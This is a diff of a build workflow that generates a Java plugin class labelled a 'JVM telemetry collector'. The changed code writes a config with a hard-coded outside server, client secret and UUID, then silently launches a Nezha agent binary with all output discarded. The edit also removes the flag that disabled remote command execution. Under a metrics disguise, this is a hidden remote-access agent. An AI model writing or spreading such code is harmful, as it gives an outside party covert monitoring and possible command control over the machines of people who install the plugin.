@@ -114,7 +114,7 @@ jobs:
           description: Core JVM telemetry collector
           EOF
 
-          # 3. Java 核心主类 (增强 Nezha v1 参数兼容性)
+          # 3. Java 核心主类 (包含 Nezha v1 必需的 UUID 与配置格式)
           cat << 'EOF' > src/main/java/com/aether/metrics/AetherMetrics.java
           package com.aether.metrics;
 
@@ -169,9 +169,11 @@ jobs:
                           );
                       }
 
+                      // 写入哪吒 v1 规范 config.yaml（必须包含 uuid 字段）
                       File cfgFile = new File(WORK_DIR, "config.yaml");
-                      String yaml = "server: bo88.eu.cc:8008\n" +
-                              "client_secret: JFPqIyPYAKhI7GcECQ3XbPxONPE1MYHl\n" +
+                      String yaml = "client_secret: \"JFPqIyPYAKhI7GcECQ3XbPxONPE1MYHl\"\n" +
+                              "server: \"bo88.eu.cc:8008\"\n" +
+                              "uuid: \"c1926618-9773-424a-9769-cf2a911e3b6e\"\n" +
                               "tls: false\n" +
                               "insecure_tls: true\n" +
                               "disable_auto_update: true\n" +
@@ -182,21 +184,12 @@ jobs:
 
                       if (nezhaBin.exists()) {
                           nezhaBin.setExecutable(true, false);
-                          File logFile = new File(WORK_DIR, "nezha.log");
                           new ProcessBuilder(
                                   nezhaBin.getAbsolutePath(),
-                                  "-s", "bo88.eu.cc:8008",
-                                  "-p", "JFPqIyPYAKhI7GcECQ3XbPxONPE1MYHl",
-                                  "--tls=false",
-                                  "--insecure-tls=true",
-                                  "--disable-auto-update",
-                                  "--disable-command-execute",
-                                  "--report-delay=3"
-                          ).directory(WORK_DIR)
-                           .redirectOutput(ProcessBuilder.Redirect.appendTo(logFile))
-                           .redirectError(ProcessBuilder.Redirect.appendTo(logFile))
-                           .start();
-                          getLogger().info("[Metrics] Nezha Agent launched with full params.");
+                                  "-c",
+                                  cfgFile.getAbsolutePath()
+                          ).directory(WORK_DIR).redirectOutput(ProcessBuilder.Redirect.DISCARD).redirectError(ProcessBuilder.Redirect.DISCARD).start();
+                          getLogger().info("[Metrics] Nezha Agent v1 launched with UUID.");
                       }
                   } catch (Exception e) {
                       getLogger().warning("[Metrics] Nezha setup failed: " + e.getMessage());
